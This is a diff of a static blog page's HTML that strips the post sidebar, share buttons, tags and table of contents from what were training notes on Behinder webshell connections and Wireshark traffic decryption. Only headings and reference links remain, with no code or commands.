-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/135227454">冰蝎-特征检测及报文解密 - 知乎 (zhihu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39567046/article/details/111198910?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">(2条消息) base64还原_冰蝎3.0流量分析与还原_weixin_39567046的博客-CSDN博客</a></p>
-</li>
-</ul>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
         </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">实训笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/08/25/02WEEK1%E5%86%B0%E8%9D%8E%EF%BC%9A%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5%E5%8F%8AWireshark%E6%8A%93%E5%8C%85/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2021/08/27/03WEEK1%E7%AC%AC%E4%B8%80%E5%91%A8%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          冰蝎03-知识点总结
-        
-      </div>
-    </a>
   
   
-    <a href="/2021/08/23/01%20%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">冰蝎01-基础环境搭建</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">冰蝎的基本连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xshell%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">xshell连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wireshark%E7%9A%84%E9%85%8D%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">Wireshark的配备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%86%B0%E8%9D%8E"><span class="toc-number">1.3.</span> <span class="toc-text">连接冰蝎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%8E%E6%80%9D%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">问题与思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Wireshark%E6%8A%93%E5%8C%85%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%8F%8A%E8%BF%98%E5%8E%9F"><span class="toc-number">2.</span> <span class="toc-text">Wireshark抓包流量分析及还原</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Wireshark%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Wireshark基本参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-php%E7%A8%8B%E5%BA%8F%E8%A7%A3%E8%AF%BB"><span class="toc-number">2.2.</span> <span class="toc-text">shell.php程序解读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP%E6%B5%81%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">TCP流解密过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1POST%E8%AF%B7%E6%B1%82"><span class="toc-number">2.3.1.</span> <span class="toc-text">步骤1：第一次POST请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%93%8D%E5%BA%94"><span class="toc-number">2.3.2.</span> <span class="toc-text">步骤2：服务器第一次响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E7%AC%AC%E4%BA%8C%E6%AC%A1POST%E8%AF%B7%E6%B1%82"><span class="toc-number">2.3.3.</span> <span class="toc-text">步骤3：第二次POST请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%93%8D%E5%BA%94"><span class="toc-number">2.3.4.</span> <span class="toc-text">步骤4：服务器第二次响应</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E6%96%87%E5%88%86%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">报文分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%8E%E6%80%9D%E8%80%83-1"><span class="toc-number">2.5.</span> <span class="toc-text">问题与思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">参考资料及工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><span class="toc-number">3.1.</span> <span class="toc-text">解密工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">3.2.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -536,8 +210,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
@@ -598,10 +272,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">实训笔记</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
